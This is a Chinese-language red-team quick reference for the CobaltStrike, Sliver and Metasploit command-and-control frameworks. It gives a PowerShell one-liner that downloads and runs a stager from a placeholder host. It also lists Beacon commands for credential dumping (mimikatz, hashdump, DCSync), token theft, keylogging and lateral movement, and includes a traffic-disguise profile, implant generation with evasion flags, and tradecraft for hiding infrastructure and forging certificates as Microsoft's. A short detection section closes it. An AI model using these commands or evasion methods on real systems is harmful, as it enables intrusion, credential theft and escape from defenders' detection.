# C2 框架速查（CobaltStrike / Sliver / MSF）

## 0x01 概述

C2（Command & Control）框架负责载荷投递、命令下发、流量加密与基础设施管理。与 [PEN-MSF](./PEN-MSF.md)（单兵渗透）的分工：MSF 偏漏洞利用单点突破，CS/Sliver 偏长期驻留与团队协作。

本篇面向红队场景速查：团队服务器搭建、监听器与载荷生成、Beacon/Implant 常用命令、流量伪装与对抗要点。仅限授权测试使用。

## 0x02 选型对比

| 框架 | 语言/部署 | 优势 | 场景 |
| --- | --- | --- | --- |
| MSF | Ruby，单机 | 漏洞模块海量、单兵快 | 漏洞验证 |
| CobaltStrike | Java，C/S 架构 | Beacon 生态成熟、团队协作、Malleable C2 | 红队主流 |
| Sliver | Go，单二进制 | 开源免费、多协议（mtls/wireguard/http/dns）、implant 生成灵活 | 合法替代 |

一句话带过：

- **Havoc**：开源 C2，UI 现代，主打规避（sleep mask、间接 syscall），社区活跃
- **Villain**：多协议一句话反弹 shell 托管器（handler 之间可互传会话），适合快速接管 webshell

选型建议：

- 漏洞验证 / 一次性利用：MSF（详见 [PEN-MSF](./PEN-MSF.md)）
- 多人协作长线运营、域渗透：CobaltStrike
- 开源合规 / 跨平台 implant / 审计需求：Sliver

## 0x03 CobaltStrike 核心

### 团队服务器启动

```
# ./teamserver <对外IP> <客户端连接密码> [Malleable C2 profile]
./teamserver 1.2.3.4 MyP@ss123 c2.profile
```

- 对外 IP：客户端连接与 Beacon 回连的地址
- 密码：团队成员连接 teamserver 时使用，避免弱口令（历史漏洞多与 50050 管理端口暴露有关）
- profile：流量伪装配置，强烈建议自定义（见 0x03 Malleable C2）

客户端连接：`start.bat`（或 `java -XX:+AggressiveHeap -jar cobaltstrike.jar`），Host 填 teamserver IP、端口默认 50050。

### Listener 监听器类型

| 监听器 | 连接方向 | 用途 |
| --- | --- | --- |
| Beacon HTTP/HTTPS | reverse（目标回连） | 最常用，适合目标可出网 |
| Bind TCP | bind（正向，目标监听我方 connect） | 目标不出网/隔离网络 |
| Beacon SMB | 命名管道（内网链式） | 内网横向：父 Beacon 通过管道链接子 Beacon，流量不出网 |
| DNS Beacon | DNS 隧道回连 | 极隐蔽（数据藏在 TXT/A 查询），适合严控出网环境，速度慢 |
| Foreign HTTP | 对接外部框架 | 把会话派生交给 MSF handler |

SMB Beacon 横向链思路：拿下一台边界机后，用 `jump psexec` 在内网主机派生 SMB Beacon，子节点不直接出网，全部经由链式父节点回传。

### Payload 生成

菜单路径：`Attacks → Packages →`：

- **Windows EXE (S)**：exe 落盘（S 为 stageless，无 stager 直接全量载荷）
- **Windows EXE / Windows DLL**：带 stager 的可执行文件 / DLL
- **PowerShell**：一句话命令（PS1Payload / 无 stager 版本），适合不落盘执行
- **Windows Service EXE**：配合服务安装（`sc create ... binPath=`）

PowerShell one-liner 典型形态（stager 回拉 Beacon）：

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x/a'))"
```

> 注意：该原生命令特征已被全量查杀，实战需自行混淆/加密加载，此处仅作原理示意。

### Beacon 常用命令速查

```
sleep 60                  # 心跳间隔（秒），建议配 jitter 增加随机性
checkin                   # 强制立即回连一次（低 sleep 会话等待时用）
shell whoami              # 走 cmd.exe 执行命令
getuid / ps               # 当前权限 / 进程列表
mimikatz sekurlsa::logonpasswords   # 调用 mimikatz 抓登录凭证（新版可直接 logonpasswords）
hashdump                  # 导出本地 SAM 库 NTLM Hash
dcsync DOMAIN\user        # 从域控 DCSync 指定用户 Hash（需域管权限）
steal_token <pid>         # 窃取指定进程令牌（拿高权限身份）
make_token DOMAIN\user pass   # 伪造凭证（配合 hash 传递用 pth）
jump psexec 10.0.0.1      # 横向移动：在目标派生 SMB Beacon（另有 psexec_psh / winrm）
link 10.0.0.1             # 链接内网已有 SMB Beacon（链式回传）
portscan 10.0.0.0/24 1-1024   # 内网端口扫描
socks 1080                # 在 teamserver 上开 socks4a 代理（客户端 Proxychains/ProxyCap 接入）
upload / download         # 文件上传 / 回传取证文件
keylogger / screenshot    # 键盘记录 / 截屏
note "web-srv 10.0.0.1"   # 给会话打备注（团队协作标记目标信息）
run <插件命令>            # 调用 Aggressor 插件提供的扩展命令（run + 插件）
```

> 心跳调整：上线后先 `sleep` 拉大心跳（如 300 秒起），取任务结果时用 `checkin` 强制回连；固定 0 秒心跳最容易触发流量基线告警。

### Malleable C2 Profile

自定义流量特征（uri / ua / cookie 等），把回传流量伪装成正常业务。示例片段：

```
# 伪装成正常业务站点的回传流量
http-get {
    set uri "/api/search";            # uri 伪装成业务接口
    set verb "GET";

    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0";
        metadata {
            base64url;                # 元数据 base64url 编码
            prepend "sessionid=";     # 加前缀伪装成会话标识
            header "Cookie";          # 藏进 Cookie 头回传
        }
    }

    server {
        output {
            netbios;                  # 任务下发数据编码方式
            print;
        }
    }
}

http-post {
    set uri "/api/submit.php";        # 用 .php/.gif 等路径伪装正常静态/动态资源
    client {
        id {                          # 回传的任务结果数据
            base64url;
            parameter "q";            # 伪装成查询参数
        }
    }
}
```

### 常见插件

| 插件 | 用途 |
| --- | --- |
| CrossC2 | 生成 Linux/Mac 平台 Beacon，补齐跨平台能力 |
| ElevateKit | 本地提权合集（UAC Bypass、内核漏洞），Beacon 内 `elevate <exp>` 调用 |
| AggressorScripts | Sleep 语言脚本化扩展：自动化上线后动作（提权、权限维持、信息收集） |

## 0x04 Sliver 核心

服务端单二进制部署，`./sliver-server` 启动，`multiplayer` 开启多人协作并生成操作员配置。

### 生成与监听

```
# 生成 implant：--http 指定回连地址，--os 目标系统，--save 保存路径
sliver > generate --http 1.2.3.4 --os windows --save /tmp/

# 其他常用生成参数
sliver > generate --mtls 1.2.3.4:8888 --os linux --arch amd64 --format shared   # mTLS + Linux so
sliver > generate --os windows --skip-symbols --evasion                          # 免符号 + 规避选项

# 启动监听（按 implant 回连协议对应启动）
sliver > https           # HTTPS 监听（默认 443）
sliver > mtls            # mTLS 证书双向认证
sliver > dns             # DNS 隧道
sliver > wireguard       # WireGuard 隧道（流量全加密）
```

### 会话管理

```
sliver > sessions                     # 查看会话/信标列表
sliver > use 1                        # 进入指定会话（老版本为 interactive）

[sliver] > info                       # 目标信息（系统/用户/回连地址）
[sliver] > shell                      # 交互式 shell
[sliver] > execute -c whoami          # 非交互执行命令
[sliver] > portfwd add 1080 -b 10.0.0.5:3389   # 内网端口转发到本地 1080
[sliver] > socks5 start               # 在本地开 socks5 代理接入内网
```

补充：

- `beacons` 单独查看异步信标；session 会话断了立即感知，beacon 只能等下个心跳周期发现
- `armory` 扩展仓库可在线安装后渗透工具（如 RportFwd、mimikatz 相关 BOF），配合 `armory install <name>`
- Sliver 支持 BOF（Beacon Object File）复用 CS 生态的轻量内联代码，跨平台执行后渗透动作

### Implant 类型

- **Session implant**：主动维持长连接，稳定低延迟，适合交互式操作
- **Beacon implant**：异步心跳回连，抗断网、流量更像正常访问，适合长期驻留

## 0x05 流量与对抗

### 上线流量特征（被重点检测的部分）

- CS 默认 uri 为随机 4 字符、默认 GET/POST 帧结构特征、默认 profile 的 `.gif/.php` 路径特征，均已被各家 NDR/态势感知产品内置规则（微步、深信服、奇安信等）
- 默认管理端口 50050 直接暴露公网极易被指纹识别与爆破
- 默认证书 `cobaltstrike.store` 的 SHA256 指纹公开可查
- 固定心跳（无 jitter）+ 回传包大小稳定，在流量侧非常容易被基线分析命中

### 对抗手段

- **域前置（Domain Fronting）**：TLS SNI 填 CDN 高信誉域名（如 `ajax.microsoft.com`），真实 C2 地址藏在 HTTP Host 头，流量全程走 CDN
- **云函数中转**：API 网关/云函数（SCF/Lambda）做转发层，目标只见到云厂商回源 IP，隐藏真实 teamserver
- **重定向器**：前置 VPS + nginx/caddy 按规则转发（区分真假流量，真实基础设施不直接暴露）
- **Malleable 伪装**：profile 把 uri/ua/cookie 定制成正常业务特征，配合 CDN 回源隐藏 teamserver 真实地址

### 证书替换（必做）

```
# 重新生成 keystore 替换默认 cobaltstrike.store（dname 伪装成高信誉站点）
keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 \
  -genkey -keyalg RSA -alias cobaltstrike \
  -dname "CN=www.microsoft.com, OU=Microsoft, O=Microsoft, L=Redmond, ST=WA, C=US"
```

更好的做法：注册自有域名 + 免费真实证书（Let's Encrypt），TLS 层指纹同时改变。

### 上线前自查

- 真实样本**不上传 VT、不投在线沙箱**（云沙箱样本会同步威胁情报，基础设施指纹直接曝光）
- 用自建隔离沙箱（断网或白名单出口）验证免杀效果与上线行为
- 记录 kill date，避免任务结束后 implant 仍在目标环境回连

### 基础设施生命周期

- 推荐分层架构：一次性域名 → CDN/反向代理 → 重定向器（redirector）→ 真实 teamserver，任何一层被识别都可单独替换
- 域名/证书/重定向器均为一次性资源，项目结束整体下线销毁；复用旧基础设施会被威胁情报平台关联历史行动

## 0x06 检测侧一句话

- **网络侧**：JA3/JA3S 指纹（CS 默认 Java TLS 栈指纹常年被标记）、心跳周期规律（固定 sleep 无 jitter）、元数据回传包大小固定
- **主机侧**：命名管道特征（CS SMB Beacon 默认 `MSSE-` 开头随机管道名被广泛监控）、无数字签名进程发起外联

## Ref

- https://hstechdocs.helpsystems.com/manuals/ （CobaltStrike 官方手册）
- https://github.com/BishopFox/sliver （Sliver GitHub）
- https://github.com/HavocFramework/Havoc （Havoc GitHub）
- https://attack.mitre.org/techniques/T1071/ （MITRE ATT&CK T1071 应用层协议）
- https://www.cobaltstrike.com/ （CobaltStrike 官网）
